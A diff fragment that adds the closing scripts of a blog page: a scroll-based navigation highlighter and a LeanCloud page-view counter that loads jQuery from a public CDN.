+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
